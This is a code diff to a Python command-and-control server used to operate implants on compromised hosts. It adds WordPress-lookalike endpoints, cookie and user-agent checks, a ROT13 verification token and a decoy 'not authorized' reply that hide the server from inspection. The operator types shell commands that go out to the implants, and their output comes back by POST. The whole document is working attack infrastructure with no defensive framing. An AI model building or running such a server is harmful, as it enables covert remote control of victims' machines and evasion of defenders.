@@ -4,6 +4,8 @@ import re
 
 session_value = "6Q2HydryJknyIyyVv8Om"
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
+trantab = str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
+value = session_value.translate(trantab)
 
 """
 
@@ -63,6 +65,7 @@ class c2Server(BaseHTTPRequestHandler):
     # Allow GET
 
     def do_GET(self):
+        global URI, cookie, agent
         print(self.headers)
         try:
             URI = self.raw_requestline.decode().split(" ")[1]
@@ -71,7 +74,7 @@ class c2Server(BaseHTTPRequestHandler):
         except:
             pass
 
-        if URI == "/wp-login.php" and cookie == session_value and agent == user_agent:
+        if URI == "/wp-post.php" and cookie == session_value and agent == user_agent:
             self.set_headers()
             message = input("$ ")  # command=
             self.wfile.write(message.encode('utf-8'))
@@ -103,8 +106,17 @@ class c2Server(BaseHTTPRequestHandler):
 
     def do_POST(self):
         # print(self.headers)
+        global URI, cookie, agent
         self.set_headers()
-        print("data received")
+        # print(self.headers)
+        # print("data received")
+        try:
+            URI = self.raw_requestline.decode().split(" ")[1]
+            cookie = self.headers['Cookie'].split(" = ")[-1]
+            agent = self.headers['User-agent']
+        except:
+            pass
+
 
         """
 
@@ -116,16 +128,21 @@ class c2Server(BaseHTTPRequestHandler):
 
         """
 
-        print(self.client_address[0])
+        if URI == "/wp-admin/admin-ajax.php" and cookie == session_value and agent == user_agent:
+            print(self.client_address[0])
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = post_data.decode('utf-8')  # result of command execution
+            data_len = int(len(data) - 20)
+            print(data[:data_len])
+            # print(data[-20:])
+            if data[-20:] != str(value):
+                print("The verification code %s was received" %value)
 
-        content_length = int(self.headers['Content-Length'])
-
-        post_data = self.rfile.read(content_length)
-
-        data = post_data.decode('utf-8')  # result of command execution
-        data_len = int(len(data) - 20)
-        print(data[:data_len])
-
+        else:
+            self.unauth_set_headers()
+            msg = " You are not authorized. Your access is forbidden."
+            self.wfile.write(msg.encode('utf-8'))
 
 
 def runC2server():
